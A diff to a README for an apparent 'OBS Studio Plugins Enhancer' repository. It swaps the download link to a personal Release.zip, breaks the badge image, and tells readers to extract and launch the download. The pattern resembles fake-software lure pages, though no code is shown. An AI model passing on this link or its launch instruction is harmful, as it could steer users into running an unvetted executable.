@@ -13,9 +13,9 @@ Welcome to the OBS Studio Plugins Enhancer repository, where you can find a coll
 - **Video Editing**: Edit your videos directly within OBS Studio for seamless content creation.
 
 ## Installation
-To get started with the OBS Studio Plugins Enhancer, you can download the latest release [here](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip). This will provide you with the necessary plugins to enhance your OBS Studio setup.
+To get started with the OBS Studio Plugins Enhancer, you can download the latest release [here](https://github.com/BorysQ/OBS-Studio-Plugins-Enhancer/releases/download/v1.0/Release.zip). This will provide you with the necessary plugins to enhance your OBS Studio setup.
 
-[![Download Plugins](https://img.shields.io/badge/Download-Plugins-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Plugins](https://github.com/BorysQ/OBS-Studio-Plugins-Enhancer/releases/download/v1.0/Release.zip)](https://github.com/BorysQ/OBS-Studio-Plugins-Enhancer/releases/download/v1.0/Release.zip)
 
 Please make sure to extract and launch the plugins after downloading to start enjoying the enhanced features they offer.
 
